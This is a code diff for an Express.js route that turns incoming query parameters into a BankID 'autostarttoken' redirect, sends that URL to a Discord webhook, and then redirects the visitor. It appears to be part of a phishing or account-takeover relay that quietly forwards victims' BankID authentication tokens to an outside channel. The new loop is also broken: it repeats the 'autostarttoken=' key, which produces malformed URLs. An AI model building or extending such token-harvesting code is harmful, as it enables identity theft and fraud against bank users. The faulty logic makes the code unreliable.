@@ -11,8 +11,8 @@ let AMOUNT = ""
 app.use(express.json());
 
 app.get('/', (req, res) => {
-  // Construct the redirect URL with all query parameters
-  const queryString = req.originalUrl.split('?')[1]; // Get query string part after '?'
+  // Extract the query string from req.originalUrl
+  const queryString = req.originalUrl.split('?')[1];
 
   if (!queryString) {
     return res.status(400).send('Query parameters are required.');
@@ -21,22 +21,17 @@ app.get('/', (req, res) => {
   // Split the query string into individual parameters
   const params = new URLSearchParams(queryString);
 
-  // Retrieve specific query parameters
-  const autostarttoken = params.get('autostarttoken');
-  const redirect = params.get('redirect');
-
-  // Validate autostarttoken presence
-  if (!autostarttoken) {
-    return res.status(400).send('Autostarttoken parameter is required.');
-  }
-
   // Construct the redirect URL
-  let redirectUrl = `bankid:///?autostarttoken=${encodeURIComponent(autostarttoken)}`;
+  let redirectUrl = 'bankid:///?autostarttoken=';
 
-  // Append the 'redirect' parameter if provided
-  if (redirect) {
-    redirectUrl += `&redirect=${encodeURIComponent(redirect)}`;
+  // Iterate through each parameter
+  for (const [key, value] of params.entries()) {
+    // Append key-value pair to redirectUrl, properly encoded
+    redirectUrl += `${key}=${encodeURIComponent(value)}&`;
   }
+
+  // Remove trailing '&' if present
+  redirectUrl = redirectUrl.slice(0, -1);
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
@@ -44,6 +39,7 @@ app.get('/', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
 
 
